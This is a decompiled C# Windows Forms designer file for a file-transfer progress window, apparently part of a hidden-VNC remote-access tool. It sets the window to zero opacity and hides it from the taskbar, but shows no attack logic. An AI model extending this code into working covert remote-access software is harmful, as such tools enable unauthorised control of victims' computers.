namespace HVNC
{
	// Token: 0x0200001D RID: 29
	public partial class FrmTransfer : global::System.Windows.Forms.Form
	{
		// Token: 0x060000D6 RID: 214 RVA: 0x0000264B File Offset: 0x0000084B
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x060000D7 RID: 215 RVA: 0x0000CD7C File Offset: 0x0000AF7C
		private void InitializeComponent()
		{
			global::System.ComponentModel.ComponentResourceManager componentResourceManager = new global::System.ComponentModel.ComponentResourceManager(typeof(global::HVNC.FrmTransfer));
			this.DuplicateProgess = new global::System.Windows.Forms.ProgressBar();
			this.FileTransferLabel = new global::System.Windows.Forms.Label();
			this.PingTransform = new global::System.Windows.Forms.Label();
			base.SuspendLayout();
			this.DuplicateProgess.Location = new global::System.Drawing.Point(12, 12);
			this.DuplicateProgess.Name = "DuplicateProgess";
			this.DuplicateProgess.Size = new global::System.Drawing.Size(453, 23);
			this.DuplicateProgess.TabIndex = 1;
			this.FileTransferLabel.AutoSize = true;
			this.FileTransferLabel.Location = new global::System.Drawing.Point(225, 44);
			this.FileTransferLabel.Name = "FileTransferLabel";
			this.FileTransferLabel.Size = new global::System.Drawing.Size(37, 13);
			this.FileTransferLabel.TabIndex = 4;
			this.FileTransferLabel.Text = "Status";
			this.PingTransform.AutoSize = true;
			this.PingTransform.Location = new global::System.Drawing.Point(255, 44);
			this.PingTransform.Name = "PingTransform";
			this.PingTransform.Size = new global::System.Drawing.Size(95, 13);
			this.PingTransform.TabIndex = 5;
			this.PingTransform.Text = "Ping: Measuring....";
			this.PingTransform.Visible = false;
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			base.ClientSize = new global::System.Drawing.Size(475, 66);
			base.Controls.Add(this.FileTransferLabel);
			base.Controls.Add(this.DuplicateProgess);
			base.Controls.Add(this.PingTransform);
			base.Icon = (global::System.Drawing.Icon)componentResourceManager.GetObject("$this.Icon");
			base.Name = "FrmTransfer";
			base.Opacity = 0.0;
			base.ShowIcon = false;
			base.ShowInTaskbar = false;
			base.StartPosition = global::System.Windows.Forms.FormStartPosition.CenterScreen;
			base.Load += new global::System.EventHandler(this.FrmTransfer_Load);
			base.ResumeLayout(false);
			base.PerformLayout();
		}

		// Token: 0x04000090 RID: 144
		private global::System.ComponentModel.IContainer components;

		// Token: 0x04000091 RID: 145
		private global::System.Windows.Forms.ProgressBar DuplicateProgess;

		// Token: 0x04000092 RID: 146
		private global::System.Windows.Forms.Label FileTransferLabel;

		// Token: 0x04000093 RID: 147
		private global::System.Windows.Forms.Label PingTransform;
	}
}
